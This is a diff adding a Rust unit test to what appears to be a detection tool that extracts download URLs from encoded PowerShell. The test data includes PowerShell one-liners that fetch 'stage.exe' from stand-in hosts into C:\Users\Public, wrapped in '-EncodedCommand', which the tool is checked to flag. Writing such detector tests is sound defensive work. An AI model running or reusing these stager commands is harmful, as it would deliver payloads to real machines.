@@ -10114,6 +10114,25 @@ mod ps1_url_extraction_tests {
     }
 
     #[test]
+    fn webclient_downloadfiletaskasync_preserves_destination() {
+        let ps = r#"$wc=New-Object Net.WebClient;$wc.DownloadFileTaskAsync("https://taskasync-webclient.example/stage.exe","C:\Users\Public\stage.exe")"#;
+        let script = format!("powershell -EncodedCommand {}\r\n", encode(ps));
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://taskasync-webclient.example/stage.exe"
+                        && dst.as_deref() == Some("C:\\Users\\Public\\stage.exe")
+            )
+        });
+        assert!(
+            has,
+            "DownloadFileTaskAsync destination was not preserved: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn webclient_downloadfile_schemeless_domain_path_url_extracted() {
         let ps = r#"$wc=New-Object Net.WebClient;$wc.DownloadFile("cdn-webclient.com/stage.exe","C:\Users\Public\stage.exe")"#;
         let script = format!("powershell -EncodedCommand {}\r\n", encode(ps));
